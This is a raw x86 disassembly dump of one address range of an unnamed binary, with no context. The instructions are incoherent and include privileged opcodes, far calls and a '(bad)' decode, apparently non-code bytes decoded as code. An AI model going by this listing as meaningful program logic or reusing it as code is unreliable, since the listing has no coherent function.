  41476b:	xchg   ecx,eax
  41476c:	add    al,0x80
  41476e:	add    BYTE PTR [esi+0x20a88682],0x1
  414775:	adc    eax,ecx
  414777:	and    al,0x1
  414779:	push   edx
  41477a:	add    al,BYTE PTR [eax+eax*8-0x60]
  41477e:	add    al,0x3e
  414780:	or     al,0x90
  414782:	mov    dh,0xf
  414784:	add    al,al
  414786:	add    BYTE PTR [eax],al
  414788:	and    ah,BYTE PTR [edx]
  41478a:	or     BYTE PTR [esi+0x14],0x98
  41478e:	and    BYTE PTR [edx+eax*4],al
  414791:	inc    ecx
  414792:	inc    edx
  414793:	call   0x161:0x10110094
  41479a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41479b:	add    BYTE PTR [eax+edx*1],cl
  41479e:	adc    BYTE PTR [ecx+edx*1],dl
  4147a1:	loopne 0x4147a3
  4147a3:	adc    BYTE PTR [eax],al
  4147a5:	arpl   WORD PTR [eax+edx*2-0x6f72f39f],dx
  4147ac:	add    DWORD PTR [eax],esp
  4147ae:	pop    es
  4147af:	sub    BYTE PTR [eax],0x10
  4147b2:	inc    esp
  4147b3:	adc    BYTE PTR [esi],al
  4147b5:	adc    al,BYTE PTR [ebp+esi*1+0x62]
  4147b9:	add    eax,0x804d1001
  4147be:	pusha  
  4147bf:	adc    DWORD PTR [edx+0x40],eax
  4147c2:	add    ecx,DWORD PTR [eax]
  4147c4:	and    DWORD PTR [eax],eax
  4147c6:	rol    BYTE PTR [edx+0x68],0x21
  4147ca:	adc    eax,DWORD PTR [eax+0x10]
  4147cd:	and    BYTE PTR [eax+0x20],dl
  4147d0:	or     DWORD PTR [ebx+0x41c53cd],esp
  4147d6:	add    al,0x18
  4147d8:	or     BYTE PTR ds:0x184a4245,al
  4147de:	add    ah,BYTE PTR [edx]
  4147e0:	pusha  
  4147e1:	and    al,0xc8
  4147e3:	fnstsw WORD PTR [eax]
  4147e5:	sub    DWORD PTR [edx],0x248c064
  4147eb:	inc    eax
  4147ec:	add    al,0x53
  4147ee:	ror    BYTE PTR [ecx+eax*1-0x80],0x1a
  4147f3:	cwde   
  4147f4:	add    BYTE PTR [edx+0x5],al
  4147f7:	xor    BYTE PTR [ecx],ah
  4147f9:	and    DWORD PTR [eax],eax
  4147fb:	add    BYTE PTR [eax],bl
  4147fd:	add    ecx,esp
  4147ff:	gs adc ecx,edi
  414802:	add    DWORD PTR [eax+0x1120a04],esi
  414808:	add    BYTE PTR [edx-0x7761c7ff],al
  41480e:	add    BYTE PTR ds:0x1038479,cl
  414814:	add    BYTE PTR [ecx],al
  414816:	add    al,0x80
  414818:	add    DWORD PTR [eax+eiz*2],eax
  41481b:	mov    eax,ds:0x24000280
  414820:	add    dl,BYTE PTR [edx+0x3c8c005]
  414826:	int3   
  414827:	push   es
  414828:	add    bl,BYTE PTR [eax+0x0]
  41482b:	dec    edx
  41482c:	and    DWORD PTR [eax],eax
  41482e:	sub    BYTE PTR [eax],al
  414830:	sbb    al,0x0
  414832:	and    al,0x80
  414834:	sub    BYTE PTR [eax+0x21004028],0x0
  41483b:	add    BYTE PTR [eax+0x10],al
  41483e:	or     al,0x21
  414840:	adc    al,BYTE PTR [ecx+ecx*2]
  414843:	or     dl,BYTE PTR [eax]
  414845:	push   ss
  414846:	push   eax
  414847:	adc    DWORD PTR [eax-0x5f],edi
  41484a:	add    al,0x42
  41484c:	pop    eax
  41484d:	sbb    BYTE PTR [edx],cl
  41484f:	sub    al,0x60
  414851:	nop
  414852:	inc    eax
  414853:	inc    edx
  414854:	and    DWORD PTR [edx+0x47],esp
  414857:	or     BYTE PTR [eax],cl
  414859:	adc    DWORD PTR [eax],edx
  41485b:	sub    BYTE PTR [edx],0x20
  41485e:	push   esp
  41485f:	inc    esp
  414860:	ror    BYTE PTR [edx],0x8a
  414863:	add    al,0x44
  414865:	and    DWORD PTR [eax],ebx
  414867:	xor    BYTE PTR [eax],ah
  414869:	add    eax,0xc2540448
  41486e:	adc    BYTE PTR [ecx],0x87
  414871:	add    al,0x5
  414873:	mov    DWORD PTR [eax+edx*1+0x2483600],eax
  41487a:	add    BYTE PTR [esi],ah
  41487c:	xor    al,BYTE PTR [esi+0x20302411]
  414882:	and    BYTE PTR ds:0x89004054,ah
  414888:	xchg   edx,eax
  414889:	adc    al,BYTE PTR [eax]
  41488b:	and    eax,0x1500
  414890:	sbb    cl,ah
  414892:	add    eax,0xc808828
  414897:	inc    eax
  414898:	dec    eax
  414899:	or     BYTE PTR [eax],al
  41489b:	add    al,0xc8
  41489d:	adc    dh,BYTE PTR [eax]
  41489f:	add    BYTE PTR [ecx],al
  4148a1:	mov    es,WORD PTR [ecx]
  4148a3:	add    BYTE PTR [esi],al
  4148a5:	add    BYTE PTR [ebx+0x60],dl
  4148a8:	add    BYTE PTR [eax],al
  4148aa:	js     0x4148be
  4148ac:	mov    al,0x43
  4148ae:	ror    BYTE PTR [esi],cl
  4148b0:	add    BYTE PTR [eax+eax*1+0x50310200],al
  4148b7:	inc    esp
  4148b8:	inc    edx
  4148b9:	aad    0xa
  4148bb:	ror    DWORD PTR [edx],0xc8
  4148be:	and    BYTE PTR [ecx],dh
  4148c0:	mov    BYTE PTR [edx],ah
  4148c2:	pop    es
  4148c3:	adc    BYTE PTR [eax+0x1e],cl
  4148c6:	inc    ecx
  4148c7:	adc    BYTE PTR [ecx],al
  4148c9:	cmp    BYTE PTR [eax],al
  4148cb:	or     BYTE PTR [edx+0x3a],dh
  4148ce:	or     al,0x0
  4148d0:	add    BYTE PTR [eax+0x4011f20a],dl
  4148d6:	or     BYTE PTR [eax],ah
  4148d8:	add    BYTE PTR [ecx+0xd],al
  4148db:	add    eax,0xeb040008
  4148e0:	or     BYTE PTR ds:0x84100602,ah
  4148e6:	add    BYTE PTR [eax+0x1c0019a0],ah
  4148ec:	mov    WORD PTR [edx-0x7ebfde00],es
  4148f2:	pusha  
  4148f3:	mov    BYTE PTR [esi],al
  4148f5:	inc    edx
  4148f6:	push   ss
  4148f7:	add    BYTE PTR [edx+0x74014002],cl
  4148fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148fe:	add    DWORD PTR [ecx],esp
  414900:	pusha  
  414901:	jl     0x414904
  414903:	add    BYTE PTR [edx],ah
  414905:	sub    al,0xe0
  414908:	adc    al,0x9
  41490a:	add    BYTE PTR [esi+0x22410a40],al
  414910:	push   ecx
  414911:	and    BYTE PTR [eax],0x83
  414914:	or     dl,BYTE PTR [edx]
  414916:	add    BYTE PTR [ecx],al
  414918:	or     BYTE PTR [ecx],al
  41491a:	mov    al,ds:0xb1059010
  41491f:	add    BYTE PTR [esp+eax*2+0x20],ah
  414923:	add    DWORD PTR [ecx],eax
  414925:	inc    ecx
  414926:	and    BYTE PTR [edi],cl
  414928:	or     al,BYTE PTR [esi+edx*1]
  41492b:	pusha  
  41492c:	mov    al,ds:0x61422998
  414931:	adc    BYTE PTR [eax-0x77],ch
  414934:	inc    ebx
  414935:	and    al,BYTE PTR [eax]
  414937:	add    ah,BYTE PTR [eax]
  414939:	and    al,BYTE PTR [eax]
  41493b:	adc    BYTE PTR [eax-0x7bfdbeaf],ah
  414941:	add    BYTE PTR [eax],al
  414943:	add    BYTE PTR [esi+0x1],al
  414946:	inc    eax
  414947:	add    al,BYTE PTR [ecx+0x48800147]
  41494d:	add    BYTE PTR [eax+0x42],bl
  414950:	add    BYTE PTR [esi],al
  414952:	sub    dl,BYTE PTR [eax]
  414954:	add    BYTE PTR [ecx],bl
  414956:	sub    bl,BYTE PTR [ecx+0x29]
  414959:	dec    ecx
  41495a:	pop    es
  41495b:	or     DWORD PTR [eax],esp
  41495d:	pop    es
  41495e:	add    dl,BYTE PTR [eax+eiz*1]
  414961:	adc    al,0x1
  414963:	adc    DWORD PTR [eax-0x5ffff5bc],eax
  414969:	arpl   WORD PTR [eax],si
  41496b:	inc    eax
  41496c:	dec    eax
  41496d:	push   eax
  41496e:	nop
  41496f:	inc    eax
  414970:	add    eax,0x800a424e
  414975:	and    BYTE PTR [esp+ecx*2],0x5
  414979:	add    bl,BYTE PTR [eax+0x4005a028]
  41497f:	inc    edx
  414980:	cwde   
  414981:	add    BYTE PTR [esp+eax*1],ah
  414984:	shl    DWORD PTR [eax+0x8],cl
  414987:	test   eax,0x30100644
  41498c:	(bad)  
  41498d:	jmp    0x8a1:0xc8111216
  414994:	mov    ch,0x20
  414996:	add    ecx,DWORD PTR [eax]
  414998:	adc    BYTE PTR [ecx-0x56],al
  41499b:	leave  
  41499c:	or     BYTE PTR [edx+0x521261],dl
  4149a2:	and    BYTE PTR [eax],al
  4149a4:	sub    BYTE PTR [eax],cl
  4149a6:	and    DWORD PTR [eax+0x0],eax
  4149a9:	inc    eax
  4149aa:	and    ch,BYTE PTR [eax]
  4149ac:	adc    DWORD PTR [eax+ecx*1+0x42c052c3],edx
  4149b3:	xor    BYTE PTR [eax],dl
  4149b5:	or     BYTE PTR [edi+0x4],cl
  4149b8:	add    BYTE PTR [ecx+eax*1-0x6a7ffe7c],ch
  4149bf:	jp     0x4149e4
  4149c1:	adc    esp,DWORD PTR [ecx]
  4149c3:	test   BYTE PTR [eax],dl
  4149c5:	nop
  4149c6:	mov    BYTE PTR [eax],dl
  4149c8:	sbb    BYTE PTR [eax+0x11d1408],al
  4149ce:	add    eax,DWORD PTR [esi]
  4149d0:	inc    edi
  4149d1:	add    ecx,DWORD PTR [eax+eiz*2]
  4149d4:	dec    eax
  4149d5:	sbb    BYTE PTR [eax+0x2],al
  4149d8:	and    BYTE PTR [ecx+0x49],al
  4149db:	bound  ebp,QWORD PTR [edx-0x7aff4000]
  4149e1:	add    al,0x4e
  4149e3:	xchg   DWORD PTR [eax+0x0],ebx
  4149e6:	nop
  4149e7:	nop
  4149e8:	add    eax,0x8022400
  4149ee:	xchg   DWORD PTR [eax+0x2bc84004],ebp
  4149f4:	inc    eax
  4149f5:	adc    bl,BYTE PTR [eax-0x5dcef900]
  4149fb:	mov    BYTE PTR [eax+0x82981],dl
  414a01:	popa   
  414a02:	adc    BYTE PTR [ecx],dl
  414a04:	sbb    DWORD PTR [ecx+ebp*1+0x10],ebp
  414a08:	add    DWORD PTR [eax],0x29500858
  414a0e:	inc    eax
  414a0f:	and    BYTE PTR [ecx-0x58],dl
  414a12:	enter  0xb03,0x3a
  414a16:	add    BYTE PTR [eax],0x31
  414a19:	sbb    BYTE PTR [eax+0x40],al
  414a1c:	or     ecx,DWORD PTR [eax+eax*4]
  414a1f:	sbb    al,BYTE PTR [eax+0x1880086]
  414a25:	mov    DWORD PTR [edx+0x8],esi
  414a28:	jo     0x3596452
  414a2e:	cmp    eax,0x1d032058
  414a33:	ret    
  414a34:	sbb    al,BYTE PTR [eax]
  414a36:	inc    eax
  414a37:	add    BYTE PTR [eax+0x2880208d],0x7
  414a3e:	adc    BYTE PTR [eax+0x1202a3a2],0x48
  414a45:	ret    0xc181
  414a48:	inc    esp
  414a49:	xchg   BYTE PTR [ebx],ah
  414a4b:	or     eax,0x80090841
  414a50:	sar    DWORD PTR [eax],1
  414a52:	inc    ecx
  414a53:	inc    eax
  414a54:	or     cl,BYTE PTR [edi]
  414a56:	popa   
  414a57:	cwde   
  414a58:	add    BYTE PTR [esi],0x49
  414a5b:	and    DWORD PTR [eax],0xd0470a00
  414a61:	adc    ah,BYTE PTR [ecx+0x2c240084]
  414a67:	add    BYTE PTR [eax],bl
  414a69:	push   ss
  414a6a:	repz gs pusha 
  414a6d:	add    BYTE PTR [ebx+edx*1+0x1048c208],al
  414a74:	and    al,0xc9
  414a76:	add    BYTE PTR [esi],cl
  414a78:	or     BYTE PTR [edx+0x0],al
  414a7b:	je     0x414aa1
  414a7d:	and    al,BYTE PTR [eax]
  414a7f:	inc    ebp
  414a80:	push   cs
  414a81:	mov    ecx,DWORD PTR [eax]
  414a83:	test   BYTE PTR [ecx+ebx*1],al
  414a86:	add    esp,eax
  414a88:	sub    BYTE PTR [eax],ah
  414a8a:	add    DWORD PTR [eax-0x57],eax
  414a8d:	adc    BYTE PTR [eax],al
  414a8f:	add    BYTE PTR [ebx-0x5bb95dfe],ah
  414a95:	mov    al,ds:0x913000a0
  414a9a:	push   es
  414a9b:	add    BYTE PTR [ecx-0x3fee0000],cl
  414aa1:	add    BYTE PTR [esi-0x7f93fff8],cl
  414aa7:	or     eax,0xbc044da0
  414aac:	or     BYTE PTR [esp+ecx*1],dh
  414aaf:	add    BYTE PTR [edx],al
  414ab1:	add    al,0x85
  414ab3:	adc    al,0x8
  414ab5:	inc    eax
  414ab6:	adc    al,dl
  414ab8:	inc    ecx
  414ab9:	and    al,0x30
  414abb:	add    BYTE PTR [eax],dl
  414abd:	add    BYTE PTR [ecx+0x8],al
  414ac0:	adc    al,0x24
  414ac2:	push   eax
  414ac3:	sub    BYTE PTR [ebx-0x6f],al
  414ac6:	pop    es
  414ac7:	add    al,BYTE PTR [ebx]
  414ac9:	xchg   esp,eax
  414aca:	jmp    0x4ce4af1
  414acf:	inc    edx
  414ad0:	add    BYTE PTR [edx],ch
  414ad2:	adc    al,BYTE PTR [edx*1-0x7ddeb96d]
  414ad9:	shl    BYTE PTR [eax],0x0
  414adc:	add    al,0x93
  414ade:	or     BYTE PTR [ecx],0x5a
  414ae1:	add    al,BYTE PTR [ecx-0x6d]
  414ae4:	ror    BYTE PTR [eax*1+0x298503c1],0x45
  414aec:	leave  
  414aed:	add    ecx,DWORD PTR [eax+0x20]
  414af0:	nop
  414af1:	outs   dx,BYTE PTR ds:[esi]
  414af2:	inc    eax
  414af3:	xor    ebx,DWORD PTR [eax]
  414af5:	nop
  414af6:	inc    ebx
  414af7:	inc    eax
  414af8:	xor    BYTE PTR [edx+0x1bea310c],al
  414afe:	add    BYTE PTR [edx+eax*2+0x8],al
  414b02:	add    BYTE PTR [eax],al
  414b04:	sub    bh,BYTE PTR [eax]
  414b06:	add    BYTE PTR [ebp+0x6116a000],cl
  414b0c:	or     BYTE PTR ds:0x2480011a,ch
  414b12:	add    BYTE PTR [ebp+0x14d43058],al
  414b18:	shl    BYTE PTR [edx+ebp*8],0x90
  414b1c:	and    al,0x40
  414b1e:	add    BYTE PTR [eax],cl
  414b20:	sub    BYTE PTR [edx],al
  414b22:	sbb    BYTE PTR [ecx-0x7dcfb3bc],al
  414b28:	inc    eax
  414b29:	call   0x4441dd67
  414b2e:	add    al,0x80
  414b30:	inc    eax
  414b31:	popa   
  414b32:	add    al,al
  414b34:	add    eax,0x2000a001
  414b39:	or     BYTE PTR [edx],cl
  414b3b:	and    BYTE PTR [eax],bl
  414b3d:	adc    BYTE PTR [esp+eax*1-0x5e],ah
  414b41:	push   edx
  414b42:	push   eax
  414b43:	adc    DWORD PTR [edx],edi
  414b45:	or     eax,DWORD PTR [eax-0x7bdfeb60]
  414b4b:	adc    DWORD PTR [eax-0x2d7fcefe],ecx
  414b51:	add    BYTE PTR [ecx],al
  414b53:	sub    bh,BYTE PTR [edx+0x1]
  414b56:	add    al,0x0
  414b58:	add    DWORD PTR [eax-0x40],eax
  414b5b:	mov    al,0x8
  414b5d:	push   eax
  414b5e:	push   0x228a012
  414b63:	or     ch,al
  414b65:	inc    ecx
  414b66:	mov    eax,ds:0xe423186
  414b6b:	add    ecx,edx
  414b6d:	add    BYTE PTR [eax+0x2],al
  414b70:	sub    BYTE PTR [eax],al
  414b72:	push   0x8880808
  414b77:	add    BYTE PTR [ecx],0x90
  414b7a:	dec    eax
  414b7b:	and    BYTE PTR [eax+0x8400084],ch
  414b81:	and    BYTE PTR [esi+0xa21b445],0x2c
  414b88:	add    ch,BYTE PTR [esi]
  414b8a:	adc    BYTE PTR [ecx],al
  414b8c:	sub    DWORD PTR [eax+0x4b],eax
  414b8f:	push   edx
  414b90:	xchg   ebx,eax
  414b91:	sbb    BYTE PTR [edx+0x260d819],ah
  414b97:	add    ecx,eax
  414b99:	add    al,ah
  414b9b:	test   al,0x0
  414b9d:	adc    eax,DWORD PTR [eax+0x4b081028]
  414ba3:	add    BYTE PTR ds:0x9e2840a3,dl
  414ba9:	sub    BYTE PTR [eax],cl
  414bab:	or     BYTE PTR [esi-0x1fbfdaf8],al
  414bb1:	rcl    cl,0x8e
  414bb4:	pop    eax
  414bb5:	ret    0x2180
  414bb8:	xor    al,0xc
  414bba:	xchg   edx,eax
  414bbb:	mov    dh,BYTE PTR [eax]
  414bbd:	mov    BYTE PTR [ecx],ch
  414bbf:	shl    DWORD PTR [eax-0x7fb9feff],0x40
  414bc6:	add    al,0xc0
  414bc8:	test   al,0xd
  414bca:	inc    ecx
  414bcb:	or     BYTE PTR [ecx],0x66
  414bce:	add    BYTE PTR [ecx],dl
  414bd0:	and    BYTE PTR ds:0x4a080f3a,0x80
  414bd7:	test   al,0x40
  414bd9:	mov    ah,0x8
  414bdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bdc:	or     DWORD PTR [esi+0x910001],ebp
  414be2:	or     BYTE PTR [eax],al
  414be4:	add    al,0x38
  414be6:	or     dl,BYTE PTR [ecx+0x19]
  414be9:	add    al,0x60
  414beb:	add    BYTE PTR [ecx-0x70],dh
  414bee:	aaa    
  414bef:	jp     0x414b71
  414bf1:	test   DWORD PTR [eax+0x2c280008],eax
  414bf7:	adc    BYTE PTR [ecx],0x43
  414bfa:	or     BYTE PTR [edx-0xe],bl
  414bfd:	add    al,0x20
  414bff:	test   DWORD PTR [ecx+0x10],edx
  414c02:	and    eax,0x9a800a17
  414c07:	add    dh,BYTE PTR [ebx+eax*1]
  414c0a:	inc    eax
  414c0b:	add    dl,al
  414c0d:	xor    BYTE PTR [eax],cl
  414c0f:	and    bl,ah
  414c11:	and    dl,ah
  414c13:	sbb    BYTE PTR [ebp+0x0],ah
  414c16:	add    ah,BYTE PTR [eax+eax*4+0x2851a008]
  414c1d:	xor    BYTE PTR [eax],cl
  414c1f:	add    ch,0x81
  414c22:	add    al,BYTE PTR [eax]
  414c24:	and    BYTE PTR [eax+0x19],0x1
  414c28:	and    BYTE PTR [esi],cl
  414c2a:	or     BYTE PTR [eax],bl
  414c2c:	dec    eax
  414c2d:	mov    al,ds:0x110615c
  414c32:	cmp    BYTE PTR [eax],0x8
  414c35:	add    BYTE PTR [eax+0x50],dl
  414c38:	pop    es
  414c39:	sbb    al,0x4b
  414c3b:	mov    BYTE PTR [edx+eax*2],ah
  414c3e:	pop    esp
  414c3f:	and    BYTE PTR [eax+0x8490800],bl
  414c45:	add    DWORD PTR [eax],esp
  414c47:	and    BYTE PTR [edi+0x30418c00],0xc
  414c4e:	sub    dl,BYTE PTR [ecx]
  414c50:	adc    BYTE PTR [eax+0xac00003],al
  414c56:	xchg   BYTE PTR [ecx+0x25402d21],dl
  414c5c:	or     BYTE PTR ds:0xb0184008,al
  414c62:	cmp    eax,DWORD PTR [eax]
  414c64:	inc    eax
  414c65:	loop   0x414be8
  414c67:	or     DWORD PTR [ecx],ecx
  414c69:	add    BYTE PTR [edx],ah
  414c6b:	add    BYTE PTR [eax],ch
  414c6d:	or     eax,DWORD PTR [eax+0x3]
  414c70:	or     DWORD PTR [eax],eax
  414c72:	adc    BYTE PTR [esi+0x4c],al
  414c75:	add    al,0x2d
  414c77:	add    BYTE PTR [eax],al
  414c79:	inc    esi
  414c7a:	or     DWORD PTR [ecx],eax
  414c7c:	mov    BYTE PTR [eax],ah
  414c7e:	mov    ds:0x124228,eax
  414c83:	push   eax
  414c84:	or     BYTE PTR ds:0x4080b660,al
  414c8a:	inc    eax
  414c8b:	mov    al,BYTE PTR [eax]
  414c8d:	or     al,0x38
  414c8f:	add    eax,0x81080202
  414c94:	inc    ecx
  414c95:	add    al,0x24
  414c97:	add    DWORD PTR [ecx+0x9],ebp
  414c9a:	push   ss
  414c9b:	add    BYTE PTR [esi+0x4],0x45
  414c9f:	and    DWORD PTR ds:0x4083421,0x81c180
  414ca9:	push   eax
  414caa:	and    al,0xc
  414cac:	add    BYTE PTR [eax],al
  414cae:	pusha  
  414caf:	adc    BYTE PTR [eax+0x50001204],al
  414cb5:	add    BYTE PTR [eax-0x7c],dl
  414cb8:	inc    eax
  414cb9:	add    al,0x32
  414cbb:	mov    al,ds:0x83200448
  414cc0:	sbb    dl,BYTE PTR [ecx+0x0]
  414cc3:	add    BYTE PTR [edx],cl
  414cc5:	les    edx,FWORD PTR [eax]
  414cc7:	lldt   WORD PTR [eax+0x32c70000]
  414cce:	xchg   ebp,eax
  414ccf:	adc    DWORD PTR [eax],0x1863106
  414cd5:	and    ah,BYTE PTR [eax]
  414cd7:	jp     0x414d21
  414cd9:	adc    al,BYTE PTR [ecx]
  414cdb:	inc    edx
  414cdc:	sbb    al,0x12
  414cde:	add    al,0x2
  414ce0:	inc    edx
  414ce1:	push   es
  414ce2:	xor    DWORD PTR [edx+0x19],0xc
  414ce6:	rcl    BYTE PTR [edx+0x1],0x41
  414cea:	add    BYTE PTR [eax],al
  414cec:	imul   ecx,DWORD PTR [eax],0x84198042
  414cf2:	add    BYTE PTR [eax],ah
  414cf4:	inc    ecx
  414cf5:	inc    esi
  414cf6:	pop    eax
  414cf7:	add    DWORD PTR [eax+0x30218811],eax
  414cfd:	xor    BYTE PTR [eax+0x40],ah
  414d00:	mov    ds:0xb490422,eax
  414d05:	rcl    BYTE PTR [ecx],0x64
  414d08:	arpl   WORD PTR [ebx+0xd],cx
  414d0b:	inc    esp
  414d0c:	or     BYTE PTR [eax+0x40],0x12
  414d10:	sub    BYTE PTR [ecx],cl
  414d12:	adc    ah,cl
  414d14:	push   es
  414d15:	inc    edx
  414d16:	and    BYTE PTR [edx],al
  414d18:	pop    es
  414d19:	sbb    BYTE PTR [eax],dl
  414d1b:	and    ah,BYTE PTR [eax+ebx*1+0x8500480]
  414d22:	adc    al,0x10
  414d24:	push   ecx
  414d25:	mov    WORD PTR [esi],es
  414d27:	lds    eax,FWORD PTR [eax+0xa0200]
  414d2d:	add    BYTE PTR [ecx+eax*1+0x33508601],dl
  414d34:	and    DWORD PTR [eax],eax
  414d36:	push   ss
  414d37:	mov    BYTE PTR fs:[ebp-0x70],cl
  414d3b:	add    BYTE PTR [ecx+0x0],dl
  414d3e:	add    DWORD PTR [edx+0x31],eax
  414d41:	or     al,0x0
  414d43:	add    BYTE PTR [eax-0x40],0x60
  414d47:	pop    es
  414d48:	push   ebx
  414d49:	mov    al,BYTE PTR [edi+eax*1]
  414d4c:	out    0x11,al
  414d4e:	add    al,0x9c
  414d50:	add    DWORD PTR [ecx],ecx
  414d52:	or     DWORD PTR [eax],eax
  414d54:	push   eax
  414d55:	mov    DWORD PTR ds:0x4184,esp
  414d5b:	xchg   BYTE PTR [eax+ecx*1],al
  414d5e:	sub    al,0x84
  414d60:	add    BYTE PTR ds:0x1030f00,cl
  414d66:	popa   
  414d67:	xchg   ecx,eax
  414d68:	add    BYTE PTR [ecx+0xc],0x0
  414d6c:	add    DWORD PTR [eax+0x88e5029],0x20109001
  414d76:	and    al,0xc4
  414d78:	mov    eax,ds:0xa822220
  414d7d:	cwde   
  414d7e:	and    BYTE PTR [eax+ecx*1+0x4020210],dl
  414d85:	gs inc eax
  414d87:	sbb    BYTE PTR [eax-0x40],dl
  414d8a:	adc    BYTE PTR [ebx],ah
  414d8c:	cmp    al,BYTE PTR [eax+0x18002041]
  414d92:	and    al,0xa
  414d94:	cmp    al,0xa
  414d96:	xchg   ebp,eax
  414d97:	and    BYTE PTR [eax],al
  414d99:	dec    eax
  414d9a:	add    BYTE PTR [edx+eax*2],cl
  414d9d:	or     BYTE PTR [eax],cl
  414d9f:	sub    DWORD PTR [ebp+0x100234],0x41a403ab
  414da9:	add    eax,0x40422b2b
  414dae:	sbb    al,0x6a
  414db0:	rol    BYTE PTR [eax],0x40
  414db3:	xor    al,0x0
  414db5:	add    BYTE PTR [eax+eax*1],al
  414db8:	sahf   
  414db9:	sub    BYTE PTR [eax+0x29168020],ah
  414dbf:	add    eax,0x1c064007
  414dc4:	or     al,0x62
  414dc6:	or     BYTE PTR [ecx],al
  414dc8:	sub    BYTE PTR [edx+0x10c00062],cl
  414dce:	add    BYTE PTR [ecx+ecx*4+0x20],0x29
  414dd3:	and    BYTE PTR [ecx],dh
  414dd5:	test   BYTE PTR [eax+0x11000054],al
  414ddb:	adc    BYTE PTR [edx],al
  414ddd:	or     eax,0x340a1a00
  414de2:	xchg   edx,eax
  414de3:	add    al,BYTE PTR [eax+0x8]
  414de6:	mov    cl,0xc5
  414de8:	mov    al,ds:0x2070d473
  414ded:	xor    eax,0xb10c92c2
  414df2:	adc    BYTE PTR [edx],ch
  414df4:	add    BYTE PTR [ecx],cl
  414df6:	bound  eax,QWORD PTR [eax+0x44]
  414df9:	add    BYTE PTR [eax],ah
  414dfb:	add    BYTE PTR [eax+0x1236812a],dl
  414e01:	xor    al,BYTE PTR [edx-0x5af9d2f8]
  414e07:	add    BYTE PTR [eax+edx*4+0x69],0x83
  414e0c:	add    eax,0x23300000
  414e11:	adc    BYTE PTR [ecx+0x0],cl
  414e14:	xor    al,0x65
  414e16:	add    BYTE PTR [ecx-0x3f7a9fe0],al
  414e1c:	add    BYTE PTR [eax],ah
  414e1e:	add    BYTE PTR [esi],al
  414e20:	add    BYTE PTR [eax+eax*1],dh
  414e23:	mov    BYTE PTR [eax-0x3e],al
  414e26:	xchg   BYTE PTR [eax],ch
  414e28:	add    ch,BYTE PTR [eax+0x8]
  414e2b:	inc    eax
  414e2c:	and    DWORD PTR [ebx],eax
  414e2e:	mov    BYTE PTR [eax+0x24],dh
  414e31:	out    0x8d,al
  414e33:	or     al,0x65
  414e35:	xor    BYTE PTR [eax],al
  414e37:	add    al,0x61
  414e39:	or     BYTE PTR [eax],0xe1
  414e3c:	or     al,0x50
  414e3e:	adc    BYTE PTR [ebp+0x71],bl
  414e41:	or     al,0x20
  414e43:	add    al,0x5
  414e45:	cmp    BYTE PTR [ecx],al
  414e47:	or     bl,BYTE PTR [edi]
  414e49:	test   al,0x32
  414e4b:	and    ah,BYTE PTR [eax]
  414e4d:	add    BYTE PTR [eax+ebp*1],0x40
  414e51:	and    eax,0x8900000
  414e56:	adc    DWORD PTR [eax],ecx
  414e58:	push   cs
  414e59:	test   al,0x66
  414e5b:	test   al,0xdc
  414e5d:	add    BYTE PTR [eax+eax*8],al
  414e60:	add    BYTE PTR [eax+0xc],0x52
  414e64:	add    DWORD PTR [ebx+eiz*1],eax
  414e67:	push   esp
  414e68:	add    BYTE PTR [eax],al
  414e6a:	add    al,cl
  414e6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e6d:	xor    ecx,0x18
  414e70:	add    BYTE PTR [edx],ah
  414e72:	adc    BYTE PTR [ecx-0x5fffb800],al
  414e78:	adc    eax,DWORD PTR [eax-0x4f7ffe00]
  414e7e:	push   ebp
  414e7f:	push   ss
  414e80:	rol    BYTE PTR [eax],0x41
  414e83:	sbb    eax,0x85a19009
  414e88:	cmp    BYTE PTR [edx+0x86210d],al
  414e8e:	and    BYTE PTR [ecx],0xf4
  414e91:	add    BYTE PTR [edi],cl
  414e93:	inc    eax
  414e94:	add    BYTE PTR [eax],al
  414e96:	add    BYTE PTR [edx],0x6
  414e99:	gs ret 
  414e9b:	xchg   DWORD PTR [eax+0x4881a38e],eax
  414ea1:	add    DWORD PTR [eax],0xda206c18
  414ea7:	sar    BYTE PTR [eax],0x28
  414eaa:	add    BYTE PTR [eax],al
  414eac:	add    BYTE PTR [eax-0x1b],ch
  414eaf:	or     BYTE PTR [eax+eax*4],cl
  414eb2:	add    DWORD PTR [eax+0x0],esp
  414eb5:	sbb    DWORD PTR [eax],eax
  414eb7:	add    DWORD PTR [eax],ecx
  414eb9:	inc    ecx
  414eba:	add    BYTE PTR ds:0xa80042a,dl
  414ec0:	test   BYTE PTR [ecx],ah
  414ec2:	and    ebp,DWORD PTR [ebx+0x20]
  414ec5:	test   BYTE PTR [ecx+0x0],al
  414ec8:	add    DWORD PTR [eax],edx
  414eca:	adc    ecx,DWORD PTR [eax]
  414ecc:	shl    BYTE PTR [eax+0x8a30024],0x0
  414ed3:	add    BYTE PTR [eax+esi*4],al
  414ed6:	pop    es
  414ed7:	pop    es
  414ed8:	add    DWORD PTR [eax],0x401210
  414ede:	add    BYTE PTR [eax+0x400280],al
  414ee4:	or     BYTE PTR [eax],al
  414ee6:	in     eax,0xa6
  414ee8:	and    BYTE PTR [eax],dl
  414eea:	add    BYTE PTR ds:0x3002009a,cl
  414ef0:	inc    ecx
  414ef1:	inc    eax
  414ef2:	dec    ecx
  414ef3:	or     al,0x67
  414ef5:	add    BYTE PTR [eax],al
  414ef7:	add    DWORD PTR [eax],eax
  414ef9:	add    cl,BYTE PTR [eax+0x30]
  414efc:	adc    BYTE PTR [esi],dl
  414efe:	dec    eax
  414eff:	bound  eax,QWORD PTR [eax]
  414f01:	test   al,ah
  414f03:	add    DWORD PTR [ecx+0x0],0xffffffa2
  414f07:	add    al,0x20
  414f09:	or     al,cl
  414f0b:	or     dl,BYTE PTR [eax]
  414f0d:	mov    BYTE PTR [edx],al
  414f0f:	add    BYTE PTR [eax+0x60404020],al
  414f15:	push   eax
  414f16:	add    BYTE PTR [ebx+eax*1],al
  414f19:	xor    BYTE PTR [edx+0x70],al
  414f1c:	dec    esp
  414f1d:	add    BYTE PTR [eax],al
  414f1f:	xor    BYTE PTR [eax],0x4b
  414f22:	and    BYTE PTR [ebx],al
  414f24:	add    al,0x9
  414f26:	aam    0x1
  414f28:	or     BYTE PTR [ebp+0x9422308],dl
  414f2e:	push   eax
  414f2f:	dec    eax
  414f30:	adc    al,0x20
  414f32:	add    BYTE PTR [ecx+eax*2],al
  414f35:	or     al,bl
  414f37:	push   es
  414f38:	add    BYTE PTR [ebx],al
